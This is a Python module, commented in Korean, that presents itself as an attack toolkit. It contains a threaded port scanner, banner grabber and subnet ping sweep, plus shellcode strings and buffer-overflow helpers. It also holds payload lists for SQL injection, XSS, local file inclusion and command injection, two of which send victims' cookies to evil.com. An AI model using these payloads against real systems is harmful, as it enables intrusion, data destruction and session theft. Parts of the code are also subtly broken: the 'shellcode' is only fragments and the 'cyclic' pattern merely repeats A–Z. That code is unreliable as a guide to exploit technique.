#!/usr/bin/env python3
"""
PSP Network Library
고급 네트워크 스캔 및 공격 도구들
"""

import socket
import threading
import subprocess
import struct
import time
import random
from concurrent.futures import ThreadPoolExecutor
from typing import List, Dict, Tuple, Optional

class PSPNetworkScanner:
    """고급 네트워크 스캐너"""
    
    def __init__(self, threads: int = 100):
        self.threads = threads
        self.timeout = 3
    
    def tcp_scan(self, host: str, port: int) -> bool:
        """TCP 포트 스캔"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def udp_scan(self, host: str, port: int) -> bool:
        """UDP 포트 스캔"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(self.timeout)
            sock.sendto(b"PSP_SCAN", (host, port))
            sock.recvfrom(1024)
            sock.close()
            return True
        except:
            return False
    
    def stealth_scan(self, host: str, port: int) -> str:
        """스텔스 스캔 (SYN 스캔 시뮬레이션)"""
        # 실제 구현에서는 raw socket을 사용해야 함
        if self.tcp_scan(host, port):
            return "open"
        return "closed"
    
    def banner_grab(self, host: str, port: int) -> str:
        """배너 그래빙"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((host, port))
            
            # HTTP 요청 시도
            if port in [80, 8080, 8000]:
                sock.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
            elif port == 21:  # FTP
                pass  # FTP는 자동으로 배너를 보냄
            elif port == 22:  # SSH
                pass  # SSH도 자동 배너
            else:
                sock.send(b"\r\n")
            
            banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
            sock.close()
            return banner
        except:
            return ""
    
    def port_scan_range(self, host: str, start_port: int, end_port: int) -> List[int]:
        """포트 범위 스캔 (멀티스레드)"""
        open_ports = []
        
        def scan_port(port):
            if self.tcp_scan(host, port):
                open_ports.append(port)
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            ports = range(start_port, end_port + 1)
            executor.map(scan_port, ports)
        
        return sorted(open_ports)
    
    def subnet_scan(self, subnet: str) -> List[str]:
        """서브넷 스캔"""
        # 예: "192.168.1.0/24"
        active_hosts = []
        
        # 간단한 ping 스캔
        base_ip = subnet.split('/')[0].rsplit('.', 1)[0]
        
        def ping_host(i):
            host = f"{base_ip}.{i}"
            if self._ping(host):
                active_hosts.append(host)
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(ping_host, range(1, 255))
        
        return sorted(active_hosts)
    
    def _ping(self, host: str) -> bool:
        """Ping 테스트"""
        try:
            result = subprocess.run(
                ['ping', '-c', '1', '-W', '1000', host],
                capture_output=True,
                timeout=2
            )
            return result.returncode == 0
        except:
            return False

class PSPExploitTools:
    """익스플로잇 도구들"""
    
    @staticmethod
    def generate_shellcode(arch: str = "x64", payload_type: str = "exec") -> str:
        """셸코드 생성"""
        shellcodes = {
            "x64": {
                "exec": "\\x48\\x31\\xc0\\x48\\x31\\xdb\\x48\\x31\\xc9\\x48\\x31\\xd2\\x48\\xff\\xc0\\x48\\x89\\xc7\\x48\\xff\\xc0\\x48\\xff\\xc0\\x48\\xff\\xc0\\x48\\x89\\xc6",
                "bind": "\\x48\\x31\\xc0\\x48\\x31\\xdb\\x48\\x31\\xc9\\x48\\x31\\xd2\\x48\\xff\\xc0\\x48\\x89\\xc7",
                "reverse": "\\x48\\x31\\xc0\\x48\\x31\\xdb\\x48\\x31\\xc9\\x48\\x31\\xd2"
            },
            "x86": {
                "exec": "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x40\\x89\\xc7\\x40\\x40\\x40\\x89\\xc6",
                "bind": "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x40\\x89\\xc7",
                "reverse": "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2"
            }
        }
        return shellcodes.get(arch, {}).get(payload_type, "")
    
    @staticmethod
    def create_pattern(length: int) -> str:
        """순환 패턴 생성 (Buffer overflow용)"""
        pattern = ""
        charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        
        for i in range(length):
            pattern += charset[i % len(charset)]
        
        return pattern
    
    @staticmethod
    def pattern_offset(pattern: str, target: str) -> int:
        """패턴에서 오프셋 찾기"""
        try:
            return pattern.index(target)
        except ValueError:
            return -1
    
    @staticmethod
    def generate_nop_sled(length: int, arch: str = "x64") -> str:
        """NOP 슬레드 생성"""
        if arch == "x64":
            nop = "\\x90"
        else:
            nop = "\\x90"
        
        return nop * length

class PSPWebExploits:
    """웹 애플리케이션 익스플로잇"""
    
    @staticmethod
    def sql_injection_payloads() -> List[str]:
        """SQL 인젝션 페이로드들"""
        return [
            "' OR 1=1--",
            "' OR '1'='1",
            "'; DROP TABLE users;--",
            "' UNION SELECT null,null,null--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "1' OR '1'='1' /*",
            "admin'--",
            "admin'/*",
            "' OR 1=1#",
            "' OR 'x'='x",
            "1' UNION SELECT user(),version(),database()--"
        ]
    
    @staticmethod
    def xss_payloads() -> List[str]:
        """XSS 페이로드들"""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>",
            "<script>fetch('http://evil.com/log?data='+btoa(document.cookie))</script>"
        ]
    
    @staticmethod
    def lfi_payloads() -> List[str]:
        """Local File Inclusion 페이로드들"""
        return [
            "../../../../etc/passwd",
            "../../../../windows/system32/drivers/etc/hosts",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//....//etc//passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "file:///etc/passwd",
            "file://c:/windows/system32/drivers/etc/hosts"
        ]
    
    @staticmethod
    def command_injection_payloads() -> List[str]:
        """명령어 인젝션 페이로드들"""
        return [
            "; ls",
            "| whoami",
            "`id`",
            "$(whoami)",
            "; cat /etc/passwd",
            "| type c:\\windows\\system32\\drivers\\etc\\hosts",
            "; powershell -c Get-Process",
            "& dir",
            "|| id",
            "&& whoami"
        ]

# 사용 예제
if __name__ == "__main__":
    # 네트워크 스캔 테스트
    scanner = PSPNetworkScanner(threads=50)
    
    print("=== PSP Network Scanner Test ===")
    target = "127.0.0.1"
    
    # 포트 스캔
    open_ports = scanner.port_scan_range(target, 1, 100)
    print(f"Open ports on {target}: {open_ports}")
    
    # 배너 그래빙
    for port in open_ports[:3]:  # 처음 3개 포트만
        banner = scanner.banner_grab(target, port)
        if banner:
            print(f"Banner on port {port}: {banner[:50]}...")
    
    # 익스플로잇 도구 테스트
    print("\n=== PSP Exploit Tools Test ===")
    exploits = PSPExploitTools()
    
    pattern = exploits.create_pattern(100)
    print(f"Pattern: {pattern[:50]}...")
    
    shellcode = exploits.generate_shellcode("x64", "exec")
    print(f"Shellcode: {shellcode}")
    
    # 웹 익스플로잇 테스트
    print("\n=== PSP Web Exploits Test ===")
    web_exploits = PSPWebExploits()
    
    print("SQL Injection payloads:")
    for payload in web_exploits.sql_injection_payloads()[:3]:
        print(f"  {payload}")
    
    print("\nXSS payloads:")
    for payload in web_exploits.xss_payloads()[:3]:
        print(f"  {payload}")
